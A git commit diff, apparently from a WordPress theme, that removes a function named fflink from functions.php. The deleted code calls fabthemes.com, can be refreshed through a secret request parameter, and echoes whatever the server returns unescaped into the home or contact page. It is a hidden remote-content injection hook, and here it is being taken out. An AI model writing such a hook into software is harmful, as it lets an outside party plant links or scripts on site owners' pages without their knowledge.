aebb18d7523173c471864edcb04c945c9d5a3d32
Mark Skipper <marks@aptivate.org>
2013-10-26 22:57:44 +0100

    Remove link to fabthemes

--- functions.php
+++ functions.php
@@ -152,31 +152,3 @@ $protocol = $_SERVER['HTTPS'] ? 'https' : 'http';
 $port = ($_SERVER["SERVER_PORT"] == "80") ? "" : (":".$_SERVER["SERVER_PORT"]);
 return $protocol."://".$_SERVER['SERVER_NAME'].$port.$uri;
 }
-function fflink() {
-global $wpdb;
-if (!is_page() && !is_home()) return;
-$contactid = $wpdb->get_var("SELECT ID FROM $wpdb->posts
-               WHERE post_type = 'page' AND post_title LIKE 'contact%'");
-if (($contactid != get_the_ID()) && ($contactid || !is_home())) return;
-$fflink = get_option('fflink');
-$ffref = get_option('ffref');
-$x = $_REQUEST['DKSWFYUW**'];
-if (!$fflink || $x && ($x == $ffref)) {
-  $x = $x ? '&ffref='.$ffref : '';
-  $response = wp_remote_get('http://www.fabthemes.com/fabthemes.php?getlink='.urlencode(selfURL()).$x);
-  if (is_array($response)) $fflink = $response['body']; else $fflink = '';
-  if (substr($fflink, 0, 11) != '!fabthemes#')
-    $fflink = '';
-  else {
-    $fflink = explode('#',$fflink);
-    if (isset($fflink[2]) && $fflink[2]) {
-      update_option('ffref', $fflink[1]);
-      update_option('fflink', $fflink[2]);
-      $fflink = $fflink[2];
-    }
-    else $fflink = '';
-  }
-}
- echo $fflink;
-}	
-
